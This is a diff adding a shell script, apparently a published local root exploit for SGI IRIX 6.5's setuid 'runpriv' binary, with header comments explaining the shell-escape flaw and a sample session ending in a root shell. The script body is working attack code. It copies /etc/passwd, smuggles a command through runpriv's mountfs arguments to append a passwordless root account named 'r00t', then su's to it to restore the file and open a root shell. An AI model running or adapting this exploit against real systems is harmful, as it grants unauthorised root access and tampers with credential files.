@@ -1,0 +1,46 @@
+#!/bin/sh
+# SGI IRIX 6.5 /usr/sysadm/bin/runpriv local root exploit
+# =======================================================
+# 'runpriv' checks to see if you have been granted privilege, 
+# and if so it runs the command privilege found in the 
+# directory /usr/sysadm/privbin with the remaining arguments.
+#
+# 'runpriv' is a suid root binary in a default installation
+# of IRIX 6.5, runpriv does not filter shell escape sequences
+# before passing them as arguements to privileges and allows
+# for the executing of arbitrary commands as root by authorised
+# users. This exploit assumes the user has the mountfs privilege
+# which can be enabled by root with the following command.
+#
+# "/usr/sysadm/bin/addpriv user mountfs"
+#
+# Example.
+#  -bash-2.05b$ id
+#  uid=16071(user) gid=20(user)
+#  -bash-2.05b$ uname -a
+#  IRIX64 IRIS 6.5 04101931 IP30
+#  -bash-2.05b$ ./xrunpriv.sh
+#  [ SGI IRIX 6.5 /usr/sysadm/bin/runpriv local root exploit
+#  [ Creating cleanup and shell scripts
+#  [ game over
+#  # id
+#  uid=0(root) gid=0(sys)
+#
+# - prdelka
+echo [ SGI IRIX 6.5 /usr/sysadm/bin/runpriv local root exploit
+echo [ Creating cleanup and shell scripts
+rm -rf /tmp/passwd123
+rm -rf /tmp/rootcmd.sh
+cp /etc/passwd /tmp/passwd123
+echo "#!/bin/sh" >> /tmp/rootcmd.sh
+echo "mv /tmp/passwd123 /etc/passwd" >> /tmp/rootcmd.sh
+echo "chmod 644 /etc/passwd" >> /tmp/rootcmd.sh
+echo "chown root:sys /etc/passwd" >> /tmp/rootcmd.sh
+echo "rm -rf /tmp/rootcmd.sh" >> /tmp/rootcmd.sh
+echo "/bin/sh" >> /tmp/rootcmd.sh
+chmod +x /tmp/rootcmd.sh
+/usr/sysadm/bin/runpriv mountfs -s test -d / -o \|"ksh -c 'echo r00t::0:0:r00t:/tmp:/bin/sh >> /etc/passwd'"
+echo [ game over
+su r00t -c /tmp/rootcmd.sh
+rm -rf /tmp/passwd123
+rm -rf /tmp/rootcmd.sh
